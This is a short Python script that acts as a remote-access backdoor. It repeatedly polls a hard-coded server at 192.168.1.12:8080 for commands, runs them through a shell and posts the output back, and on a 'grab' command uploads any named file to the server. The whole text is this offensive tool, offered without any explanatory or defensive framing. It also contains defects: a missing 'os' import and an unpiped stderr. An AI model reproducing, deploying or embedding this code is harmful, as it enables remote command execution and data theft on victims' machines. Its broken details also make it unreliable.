import requests
import subprocess
import time


while True:
     req = requests.get('http://192.168.1.12:8080')
     command = req.text

     if 'terminate' in command:
         break
     elif 'grab' in command:
         grab,path = command.split("*")
         if os.path.exists(path):
             url = "http://192.168.1.12:8080/data"
             files = {'file': open(path,'rb')}
             r = requests.post(url, files=files)
         else:
             post_response = requests.post(url='http://192.168.1.12:8080', data='Not able to find file')
     
     else:
         CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE)
         post_response = requests.post(url='http://192.168.1.12:8080',data=CMD.stdout.read())
         post_response = requests.post(url='http://192.168.1.12:8080',data=CMD.stderr.read())
     time.sleep(3) 
    
